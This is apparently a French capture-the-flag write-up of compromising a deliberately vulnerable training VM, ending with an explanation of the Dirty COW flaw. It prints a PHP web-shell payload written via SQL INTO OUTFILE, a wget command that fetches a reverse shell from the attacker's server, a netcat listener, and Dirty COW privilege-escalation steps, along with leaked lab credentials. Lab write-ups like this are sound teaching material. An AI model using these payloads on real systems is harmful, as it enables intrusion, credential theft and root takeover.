# nmap
Une fois l’iso lancé, on cherche son IP sur le réseau : `nmap -sP 192.1.1.0/24`  
On scan ensuite les dossiers utilisés par la plupart des appli et serveurs web : `nmap -sV --script=http-enum <IP>`  
On trouve les chemins suivants :
```
 /forum/: Forum
 /phpmyadmin/: phpMyAdmin
 /webmail/src/login.php: squirrelmail version 1.4.22
 /webmail/images/sm_logo.png: SquirrelMail
```

# forum
On se rend sur le forum, dans lequel on trouve un topic « Probleme login ? » posté par lmezard. Il contient des logs de connexions. On remarque que le log précédant la connexion réussie de lmezard contient un nom d’utilisateur ressemblant à un mot de passe : `!q\]Ej?*5K5cy*AJ`

On peut utiliser ces identifiants pour se connecter au forum. On accède au profil perso de lmezard dans lequel apparait son adresse mail : `laurie@borntosec.net`

# webmail
On se rend sur le webmail, et on utilise le mail de lmezard avec son MDP du forum.  
Dans la boite, un mail dont l’objet est « DB Access » contient les identifiants de root pour la BDD : `root/Fg-'kKXBj87E:aJ$`

# phpMyAdmin
On se rend sur phpMyAdmin, et on utilise les identifiants trouvés dans le mail. En cliquant sur l’onglet SQL, on peut effectuer une injection SQL sur le serveur. Pour cela, on a besoin de pouvoir lancer la requête suivante: `SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/path/to/writable/directory/backdoor.php"`

Il nous faut donc trouver un dossier sur le serveur avec droits d’écriture. Sinon la requête va échouer.

## dirb
On utilise la commande dirb pour scanner les dossiers du serveur : `dirb https://<IP>`  
On trouve toute une liste de dossiers, listables ou non. On teste les listables, et l’on arrive à écrire dans `/forum/templates_c/`

## Injection SQL
Le serveur Apache utilise le chemin classique `/var/www` pour stocker ses sites. On lance donc la requête : `SELECT "<?php system($_GET['cmd']); ?>" INTO OUTFILE "/var/www/forum/templates_c/backdoor.php"`

Le fichier backdoor.php va donc exécuter sur le serveur toute commande passée en argument dans l’URL, par exemple : `https://<IP>/forum/templates_c/backdoor.php?cmd=ls`
On obtient bien la liste des fichiers présents dans le dossier.

## Reverse shell
Pour faciliter la navigation dans le système de fichiers, on peut uploader un reverse shell sur le serveur pour s’y connecter à distance.  
On récupère un [reverse-shell sur le web](https://github.com/pentestmonkey/php-reverse-shell) qu’on configure pour fonctionner avec nos VM.  

Pour uploader ce shell sur le serveur, on le place sur un serveur perso et on utilise notre backdoor. Sur le serveur perso, on place php-reverse-shell à la racine du site. Sur un navigateur, on lance : `https://<IP>/forum/templates_c/backdoor.php?cmd=wget http://<IPserveur>/php-reverse-shell -O php-reverse-shell.php`
Le shell est désormais sur le serveur.

On ouvre une connexion TCP sur l’hôte : `nc -v -n -l -p 1234`  
Puis on lance le shell sur le serveur : `https://<IP>/forum/templates_c/php-reverse-shell.php`

La connexion s’effectue sur l’hôte, on a accès à un terminal avec l’utilisateur `www-data`.  
À partir de là, nous essayons de mettre en œuvre une élévation de privilège pour passer `root`.

# DirtyCOW

## Version KERNEL
On vérifie la version du Kernel : `uname -a`  
On se rend compte que la version de Kernel (3.2.0-91) est vulnérable à la faille [Dirty COW](https://en.wikipedia.org/wiki/Dirty_COW).  
Après quelques recherches sur le net, on trouve un exploit pour Dirty COW sur [Exploit DB](https://www.exploit-db.com/exploits/40839).

## Exploit
On copie le fichier `exploit_dirty.c` dans la VM : `scp exploit_dirty.c laurie@<IP>:/home/laurie`  
On compile : `gcc -pthread exploit_dirty.c -o dirty -lcrypt`  
On exécute : `./dirty <NEW-PASSWORD>`

L’exécutable va modifier le fichier `/etc/passwd`. Selon la [documentation Linux](http://www.linux-france.org/article/sys/lame/html/x829.html), le fichier est constitué de la façon suivante :
```
smithj:x:561:561:Joe Smith:/home/smithj:/bin/bash
```
Un `x` dans le champ mot de passe indique que les mots de passe sont stockés dans le fichier `/etc/shadow`.

Lorsque l’on exécute `dirty`, celui-ci va remplacer le `x` par le hash du mot de passe que nous venons de saisir. Ainsi lors de la comparaison des hash au moment de la connexion, le kernel va comparer le hash présent dans le fichier `/etc/passwd` et non plus dans le fichier `/etc/shadow`.

On exécute `su` avec le mot de passe choisi.  
On vérifie l’uid : `id`  
On se rend compte que nous sommes uid=0. BINGO !!!

On se déplace dans le dossier `/root` et avec un `cat README`, on se rend compte que nous sommes root sur la machine !

## Explication de la faille
La faille [Dirty COW](https://dirtycow.ninja/) touche le noyau Linux à partir de la version 2.6.22 (septembre 2007) jusqu’à la version 4.4.25 (octobre 2016) incluse. Elle a été corrigée depuis [la version 4.4.26](https://cdn.kernel.org/pub/linux/kernel/v4.x/ChangeLog-4.4.26).  
Elle exploite les fonctionnalités [Copy-On-Write (COW)](https://en.wikipedia.org/wiki/Copy-on-write) du noyau, d’où son nom. C’est par ce biais que le pirate peut atteindre et écrire sur des espaces mémoire qui, normalement, ne sont qu’en lecture seule.  
De cette façon, il est possible de procéder à une élévation de privilèges et devenir root.

La faille Dirty COW a été découverte par Phil Oester.
Pour plus de détails, cette [vidéo Youtube](https://www.youtube.com/watch?v=kEsshExn7aE) explique bien les choses.

